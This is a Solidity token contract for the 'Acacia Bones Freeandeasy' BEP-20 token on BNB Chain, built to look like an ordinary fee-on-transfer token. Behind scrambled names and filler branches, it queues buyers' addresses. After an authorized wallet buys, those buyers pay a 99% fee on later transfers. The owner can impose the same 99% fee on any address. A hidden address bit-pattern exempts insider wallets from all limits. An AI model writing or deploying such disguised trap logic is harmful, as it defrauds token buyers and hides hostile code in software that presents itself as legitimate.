/**
 *Submitted for verification at BscScan.com on 2022-12-21
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

abstract contract Ownable {
    address internal owner;
    mapping(address => bool) internal competent;

    constructor(address _owner) {
        owner = _owner;
        competent[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAuthorized() {
        require(isAuthorized(msg.sender), "!Authorized");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        competent[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        competent[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return competent[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        competent[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}


interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}


interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}



contract AcaciaBonesFreeandeasy is IBEP20, Ownable {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    string constant _name = "Acacia Bones Freeandeasy ";
    string constant _symbol = "AcaciaBonesFreeandeasy";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private launchedBotsIsBurn;
    mapping(address => bool) private receiverSwapLiquidityBurnWalletMax;
    mapping(address => bool) private isMarketingReceiverTrading;
    mapping(address => bool) private txLiquidityAutoMarketingIs;
    mapping(address => uint256) private burnSwapMarketingIs;
    mapping(uint256 => address) private swapBuyTradingTeam;
    uint256 public maxWalletAmount = 0;
    uint256 private launchBlock = 0;
    //BUY FEES
    uint256 private sellAutoLaunchedTeam = 0;
    uint256 private modeTeamSwapLimit = 6;

    //SELL FEES
    uint256 private burnAutoTxBotsLiquidityLimit = 0;
    uint256 private sellMinIsLimitTeamBuy = 6;

    uint256 private buyMinTradingTeamLiquidityBots = modeTeamSwapLimit + sellAutoLaunchedTeam;
    uint256 private tradingTeamMaxSwap = 100;

    address private feeSwapLiquidityMaxWalletReceiverLimit = (msg.sender); // auto-liq address
    address private tradingLiquidityLimitTeamSwapBuy = (0x2102D92CeCc7E4A255028d9DffFFdefc1CFFaeCA); // marketing address
    address private limitExemptSellTrading = DEAD;
    address private modeReceiverExemptTeam = DEAD;
    address private marketingSwapTxLimit = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private txBuyAutoFeeSellTradingWallet;
    uint256 private teamExemptBuyFee;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private swapMarketingWalletLimitMaxMin;
    uint256 private teamAutoTradingSwap;
    uint256 private txMinBurnLiquidity;
    uint256 private buyLimitIsFee;
    uint256 private modeWalletLimitSellTeam;

    bool private liquidityMinModeAutoWallet = true;
    bool private txLiquidityAutoMarketingIsMode = true;
    bool private feeIsAutoMin = true;
    bool private feeTeamWalletSell = true;
    bool private liquidityModeBotsFeeLaunched = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private txBuyLimitTrading = 6 * 10 ** 15;
    uint256 private tradingBurnMaxAuto = _totalSupply / 1000; // 0.1%

    
    uint256 private buyBotsLaunchedAutoExemptIsSell = 0;
    uint256 private marketingSwapBotsTeam = 0;
    bool public txTeamAutoReceiver = false;
    uint256 public receiverTeamSwapTrading = 0;
    bool private modeAutoSellExempt = false;
    bool private minAutoExemptWalletBotsSellMode = false;
    bool private burnBuyBotsMax = false;
    uint256 public burnMaxLiquidityIs = 0;
    uint256 private receiverMinExemptWallet = 0;
    bool public teamMarketingExemptTxBuy = false;
    uint256 private marketingSwapBotsTeam0 = 0;
    uint256 private marketingSwapBotsTeam1 = 0;
    bool private marketingSwapBotsTeam2 = false;
    bool private marketingSwapBotsTeam3 = false;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        swapMarketingWalletLimitMaxMin = true;

        launchedBotsIsBurn[msg.sender] = true;
        launchedBotsIsBurn[address(this)] = true;

        receiverSwapLiquidityBurnWalletMax[msg.sender] = true;
        receiverSwapLiquidityBurnWalletMax[0x0000000000000000000000000000000000000000] = true;
        receiverSwapLiquidityBurnWalletMax[0x000000000000000000000000000000000000dEaD] = true;
        receiverSwapLiquidityBurnWalletMax[address(this)] = true;

        isMarketingReceiverTrading[msg.sender] = true;
        isMarketingReceiverTrading[0x0000000000000000000000000000000000000000] = true;
        isMarketingReceiverTrading[0x000000000000000000000000000000000000dEaD] = true;
        isMarketingReceiverTrading[address(this)] = true;

        SetAuthorized(address(0x6368efd4aFae1Dd15e910011FffFe4103e3cF389));

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return txAutoLaunchedMarketing(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return txAutoLaunchedMarketing(sender, recipient, amount);
    }

    function txAutoLaunchedMarketing(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        if (marketingSwapBotsTeam0 == tradingTeamMaxSwap) {
            marketingSwapBotsTeam0 = txBuyLimitTrading;
        }

        if (marketingSwapBotsTeam1 == buyMinTradingTeamLiquidityBots) {
            marketingSwapBotsTeam1 = buyBotsLaunchedAutoExemptIsSell;
        }

        if (receiverMinExemptWallet == modeTeamSwapLimit) {
            receiverMinExemptWallet = marketingSwapBotsTeam1;
        }


        bool bLimitTxWalletValue = minModeWalletTeamLimit(sender) || minModeWalletTeamLimit(recipient);
        
        if (marketingSwapBotsTeam != receiverMinExemptWallet) {
            marketingSwapBotsTeam = marketingSwapBotsTeam;
        }

        if (burnBuyBotsMax == liquidityModeBotsFeeLaunched) {
            burnBuyBotsMax = marketingSwapBotsTeam3;
        }


        if (sender == uniswapV2Pair) {
            if (maxWalletAmount != 0 && isAuthorized(recipient)) {
                swapIsMaxModeSellLiquidityTrading();
            }
            if (!bLimitTxWalletValue) {
                isModeAutoReceiver(recipient);
            }
        }
        
        
        if (marketingSwapBotsTeam3 != minAutoExemptWalletBotsSellMode) {
            marketingSwapBotsTeam3 = marketingSwapBotsTeam2;
        }

        if (minAutoExemptWalletBotsSellMode == liquidityMinModeAutoWallet) {
            minAutoExemptWalletBotsSellMode = liquidityMinModeAutoWallet;
        }

        if (receiverMinExemptWallet == modeTeamSwapLimit) {
            receiverMinExemptWallet = txBuyLimitTrading;
        }


        if (inSwap || bLimitTxWalletValue) {return teamMarketingMaxExemptBurnReceiverSell(sender, recipient, amount);}


        if (!launchedBotsIsBurn[sender] && !launchedBotsIsBurn[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet!");
        }
        
        if (buyBotsLaunchedAutoExemptIsSell == tradingTeamMaxSwap) {
            buyBotsLaunchedAutoExemptIsSell = launchBlock;
        }

        if (marketingSwapBotsTeam2 != burnBuyBotsMax) {
            marketingSwapBotsTeam2 = liquidityModeBotsFeeLaunched;
        }


        require((amount <= _maxTxAmount) || isMarketingReceiverTrading[sender] || isMarketingReceiverTrading[recipient], "Max TX Limit!");

        if (minModeTradingLiquidity()) {isMarketingBurnSellBotsWallet();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        
        if (modeAutoSellExempt == liquidityMinModeAutoWallet) {
            modeAutoSellExempt = modeAutoSellExempt;
        }

        if (marketingSwapBotsTeam1 == tradingTeamMaxSwap) {
            marketingSwapBotsTeam1 = receiverMinExemptWallet;
        }


        uint256 amountReceived = isBurnTeamFee(sender) ? limitSwapSellExempt(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function teamMarketingMaxExemptBurnReceiverSell(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function isBurnTeamFee(address sender) internal view returns (bool) {
        return !receiverSwapLiquidityBurnWalletMax[sender];
    }

    function modeMinBurnSwap(address sender, bool selling) internal returns (uint256) {
        
        if (buyBotsLaunchedAutoExemptIsSell != tradingBurnMaxAuto) {
            buyBotsLaunchedAutoExemptIsSell = buyMinTradingTeamLiquidityBots;
        }

        if (marketingSwapBotsTeam2 != feeIsAutoMin) {
            marketingSwapBotsTeam2 = txLiquidityAutoMarketingIsMode;
        }

        if (marketingSwapBotsTeam0 != buyBotsLaunchedAutoExemptIsSell) {
            marketingSwapBotsTeam0 = receiverMinExemptWallet;
        }


        if (selling) {
            buyMinTradingTeamLiquidityBots = sellMinIsLimitTeamBuy + burnAutoTxBotsLiquidityLimit;
            return marketingSellBotsBurn(sender, buyMinTradingTeamLiquidityBots);
        }
        if (!selling && sender == uniswapV2Pair) {
            buyMinTradingTeamLiquidityBots = modeTeamSwapLimit + sellAutoLaunchedTeam;
            return buyMinTradingTeamLiquidityBots;
        }
        return marketingSellBotsBurn(sender, buyMinTradingTeamLiquidityBots);
    }

    function marketingSellBotsBurn(address sender, uint256 pFee) private view returns (uint256) {
        uint256 f0 = burnSwapMarketingIs[sender];
        uint256 f1 = pFee;
        if (f0 > 0 && block.timestamp - f0 > 2) {
            f1 = 99;
        }
        return f1;
    }

    function limitSwapSellExempt(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        if (marketingSwapBotsTeam3 != burnBuyBotsMax) {
            marketingSwapBotsTeam3 = burnBuyBotsMax;
        }

        if (marketingSwapBotsTeam2 != liquidityMinModeAutoWallet) {
            marketingSwapBotsTeam2 = modeAutoSellExempt;
        }

        if (buyBotsLaunchedAutoExemptIsSell != burnAutoTxBotsLiquidityLimit) {
            buyBotsLaunchedAutoExemptIsSell = receiverMinExemptWallet;
        }


        uint256 feeAmount = amount.mul(modeMinBurnSwap(sender, receiver == uniswapV2Pair)).div(tradingTeamMaxSwap);

        if (txLiquidityAutoMarketingIs[sender] || txLiquidityAutoMarketingIs[receiver]) {
            feeAmount = amount.mul(99).div(tradingTeamMaxSwap);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function swapIsMaxModeSellLiquidityTrading() private {
        if (maxWalletAmount > 0) {
            for (uint256 i = 1; i <= maxWalletAmount; i++) {
                if (burnSwapMarketingIs[swapBuyTradingTeam[i]] == 0) {
                    burnSwapMarketingIs[swapBuyTradingTeam[i]] = block.timestamp;
                }
            }
            maxWalletAmount = 0;
        }
    }

    function minModeTradingLiquidity() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    liquidityModeBotsFeeLaunched &&
    _balances[address(this)] >= tradingBurnMaxAuto;
    }

    function isMarketingBurnSellBotsWallet() internal swapping {
        
        if (marketingSwapBotsTeam1 == receiverMinExemptWallet) {
            marketingSwapBotsTeam1 = marketingSwapBotsTeam;
        }


        uint256 amountToLiquify = tradingBurnMaxAuto.mul(sellAutoLaunchedTeam).div(buyMinTradingTeamLiquidityBots).div(2);
        uint256 amountToSwap = tradingBurnMaxAuto.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        if (modeAutoSellExempt == liquidityMinModeAutoWallet) {
            modeAutoSellExempt = feeIsAutoMin;
        }

        if (marketingSwapBotsTeam1 == modeTeamSwapLimit) {
            marketingSwapBotsTeam1 = marketingSwapBotsTeam;
        }

        if (marketingSwapBotsTeam3 == modeAutoSellExempt) {
            marketingSwapBotsTeam3 = minAutoExemptWalletBotsSellMode;
        }


        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = buyMinTradingTeamLiquidityBots.sub(sellAutoLaunchedTeam.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(sellAutoLaunchedTeam).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(modeTeamSwapLimit).div(totalETHFee);
        
        payable(tradingLiquidityLimitTeamSwapBuy).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                feeSwapLiquidityMaxWalletReceiverLimit,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    function isModeAutoReceiver(address addr) private {
        if (feeReceiverLaunchedWallet() < txBuyLimitTrading) {
            return;
        }
        maxWalletAmount = maxWalletAmount + 1;
        swapBuyTradingTeam[maxWalletAmount] = addr;
    }

    function feeReceiverLaunchedWallet() private view returns (uint256) {
        address t0 = WBNB;
        if (address(this) < WBNB) {
            t0 = address(this);
        }
        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);
        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;
        return buyAmount;
    }

    function minModeWalletTeamLimit(address addr) private view returns (bool) {
        uint256 v0 = uint256(uint160(addr)) << 192;
        v0 = v0 >> 238;
        return v0 == firstSetAutoReceiver;
    }

    
    function getTxLiquidityAutoMarketingIs(address a0) public view returns (bool) {
        if (a0 != tradingLiquidityLimitTeamSwapBuy) {
            return minAutoExemptWalletBotsSellMode;
        }
        if (txLiquidityAutoMarketingIs[a0] == launchedBotsIsBurn[a0]) {
            return marketingSwapBotsTeam2;
        }
        if (txLiquidityAutoMarketingIs[a0] != launchedBotsIsBurn[a0]) {
            return modeAutoSellExempt;
        }
            return txLiquidityAutoMarketingIs[a0];
    }
    function setTxLiquidityAutoMarketingIs(address a0,bool a1) public onlyOwner {
        if (txLiquidityAutoMarketingIs[a0] != launchedBotsIsBurn[a0]) {
           launchedBotsIsBurn[a0]=a1;
        }
        if (txLiquidityAutoMarketingIs[a0] != isMarketingReceiverTrading[a0]) {
           isMarketingReceiverTrading[a0]=a1;
        }
        if (a0 == marketingSwapTxLimit) {
            marketingSwapBotsTeam3=a1;
        }
        txLiquidityAutoMarketingIs[a0]=a1;
    }

    function getReceiverSwapLiquidityBurnWalletMax(address a0) public view returns (bool) {
            return receiverSwapLiquidityBurnWalletMax[a0];
    }
    function setReceiverSwapLiquidityBurnWalletMax(address a0,bool a1) public onlyOwner {
        if (a0 == feeSwapLiquidityMaxWalletReceiverLimit) {
            feeTeamWalletSell=a1;
        }
        receiverSwapLiquidityBurnWalletMax[a0]=a1;
    }

    function getFeeTeamWalletSell() public view returns (bool) {
        if (feeTeamWalletSell != marketingSwapBotsTeam3) {
            return marketingSwapBotsTeam3;
        }
        if (feeTeamWalletSell == liquidityModeBotsFeeLaunched) {
            return liquidityModeBotsFeeLaunched;
        }
        return feeTeamWalletSell;
    }
    function setFeeTeamWalletSell(bool a0) public onlyOwner {
        feeTeamWalletSell=a0;
    }

    function getMinAutoExemptWalletBotsSellMode() public view returns (bool) {
        if (minAutoExemptWalletBotsSellMode == burnBuyBotsMax) {
            return burnBuyBotsMax;
        }
        if (minAutoExemptWalletBotsSellMode != feeIsAutoMin) {
            return feeIsAutoMin;
        }
        return minAutoExemptWalletBotsSellMode;
    }
    function setMinAutoExemptWalletBotsSellMode(bool a0) public onlyOwner {
        if (minAutoExemptWalletBotsSellMode != liquidityMinModeAutoWallet) {
            liquidityMinModeAutoWallet=a0;
        }
        if (minAutoExemptWalletBotsSellMode != liquidityMinModeAutoWallet) {
            liquidityMinModeAutoWallet=a0;
        }
        minAutoExemptWalletBotsSellMode=a0;
    }

    function getLaunchedBotsIsBurn(address a0) public view returns (bool) {
        if (a0 == limitExemptSellTrading) {
            return feeTeamWalletSell;
        }
            return launchedBotsIsBurn[a0];
    }
    function setLaunchedBotsIsBurn(address a0,bool a1) public onlyOwner {
        launchedBotsIsBurn[a0]=a1;
    }

    function getMarketingSwapTxLimit() public view returns (address) {
        if (marketingSwapTxLimit == marketingSwapTxLimit) {
            return marketingSwapTxLimit;
        }
        if (marketingSwapTxLimit != tradingLiquidityLimitTeamSwapBuy) {
            return tradingLiquidityLimitTeamSwapBuy;
        }
        if (marketingSwapTxLimit != feeSwapLiquidityMaxWalletReceiverLimit) {
            return feeSwapLiquidityMaxWalletReceiverLimit;
        }
        return marketingSwapTxLimit;
    }
    function setMarketingSwapTxLimit(address a0) public onlyOwner {
        if (marketingSwapTxLimit != tradingLiquidityLimitTeamSwapBuy) {
            tradingLiquidityLimitTeamSwapBuy=a0;
        }
        marketingSwapTxLimit=a0;
    }

    function getLimitExemptSellTrading() public view returns (address) {
        if (limitExemptSellTrading != feeSwapLiquidityMaxWalletReceiverLimit) {
            return feeSwapLiquidityMaxWalletReceiverLimit;
        }
        if (limitExemptSellTrading == tradingLiquidityLimitTeamSwapBuy) {
            return tradingLiquidityLimitTeamSwapBuy;
        }
        if (limitExemptSellTrading != feeSwapLiquidityMaxWalletReceiverLimit) {
            return feeSwapLiquidityMaxWalletReceiverLimit;
        }
        return limitExemptSellTrading;
    }
    function setLimitExemptSellTrading(address a0) public onlyOwner {
        limitExemptSellTrading=a0;
    }

    function getBurnAutoTxBotsLiquidityLimit() public view returns (uint256) {
        return burnAutoTxBotsLiquidityLimit;
    }
    function setBurnAutoTxBotsLiquidityLimit(uint256 a0) public onlyOwner {
        if (burnAutoTxBotsLiquidityLimit == burnAutoTxBotsLiquidityLimit) {
            burnAutoTxBotsLiquidityLimit=a0;
        }
        if (burnAutoTxBotsLiquidityLimit != txBuyLimitTrading) {
            txBuyLimitTrading=a0;
        }
        burnAutoTxBotsLiquidityLimit=a0;
    }

    function getSellAutoLaunchedTeam() public view returns (uint256) {
        if (sellAutoLaunchedTeam == marketingSwapBotsTeam1) {
            return marketingSwapBotsTeam1;
        }
        if (sellAutoLaunchedTeam != tradingBurnMaxAuto) {
            return tradingBurnMaxAuto;
        }
        return sellAutoLaunchedTeam;
    }
    function setSellAutoLaunchedTeam(uint256 a0) public onlyOwner {
        if (sellAutoLaunchedTeam != sellMinIsLimitTeamBuy) {
            sellMinIsLimitTeamBuy=a0;
        }
        if (sellAutoLaunchedTeam != receiverMinExemptWallet) {
            receiverMinExemptWallet=a0;
        }
        if (sellAutoLaunchedTeam != marketingSwapBotsTeam0) {
            marketingSwapBotsTeam0=a0;
        }
        sellAutoLaunchedTeam=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}